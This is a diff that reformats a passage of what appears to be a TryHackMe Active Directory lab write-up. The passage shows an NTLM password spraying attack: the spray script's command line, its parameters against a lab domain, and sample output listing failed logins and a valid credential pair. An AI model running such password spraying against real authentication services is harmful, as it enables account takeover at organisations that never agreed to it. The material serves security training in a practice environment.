@@ -121,22 +121,28 @@ If you are using the AttackBox, the password spraying script and usernames textf
 ```
 python ntlm_passwordspray.py -u <userfile> -f <fqdn> -p <password> -a <attackurl>
 ```
-`We provide the following values for each of the parameters:`
-	`**<userfile>** - Textfile containing our usernames - _"usernames.txt"_`
-	`**<fqdn>** - Fully qualified domain name associated with the organisation that we are attacking - _"za.tryhackme.com"_`
-	`**<password>** - The password we want to use for our spraying attack - _"Changeme123"_`
-	`**<attackurl>** - The URL of the application that supports Windows Authentication - _"http://ntlmauth.za.tryhackme.com"_`
-`Using these parameters, we should get a few valid credentials pairs from our password spraying attack.`
+We provide the following values for each of the parameters:
+
+- **`<userfile>`** — Textfile containing our usernames: `usernames.txt`
+- **`<fqdn>`** — Fully qualified domain name associated with the organisation that we are attacking: `za.tryhackme.com`
+- **`<password>`** — The password we want to use for our spraying attack: `Changeme123`
+- **`<attackurl>`** — The URL of the application that supports Windows Authentication: `http://ntlmauth.za.tryhackme.com`
+
+Using these parameters, we should get a few valid credential pairs from our password spraying attack.
 ##### NTLM Password Spraying Attack
-`[thm@thm]$ python3 ntlm_passwordspray.py -u usernames.txt -f za.tryhackme.com -p Changeme123 -a http://ntlmauth.za.tryhackme.com/`
-`[*] Starting passwords spray attack using the following password: Changeme123`
-`[-] Failed login with Username: anthony.reynolds`
-`[-] Failed login with Username: henry.taylor`
-`[...]`
-`[+] Valid credential pair found! Username: [...] Password: Changeme123`
-`[-] Failed login with Username: louise.talbot`
-`[...]`
-`[*] Password spray attack completed, [X] valid credential pairs found`
+
+```shell-session
+[thm@thm]$ python3 ntlm_passwordspray.py -u usernames.txt -f za.tryhackme.com -p Changeme123 -a http://ntlmauth.za.tryhackme.com/
+[*] Starting passwords spray attack using the following password: Changeme123
+[-] Failed login with Username: anthony.reynolds
+[-] Failed login with Username: henry.taylor
+[...]
+[+] Valid credential pair found! Username: [...] Password: Changeme123
+[-] Failed login with Username: louise.talbot
+[...]
+[*] Password spray attack completed, [X] valid credential pairs found
+```
+
 Using a combination of OSINT and NetNTLM password spraying, we now have our first valid credentials pairs that could be used to enumerate AD further!
 ### 4- LDAP Bind Credentials
 ##### LDAP
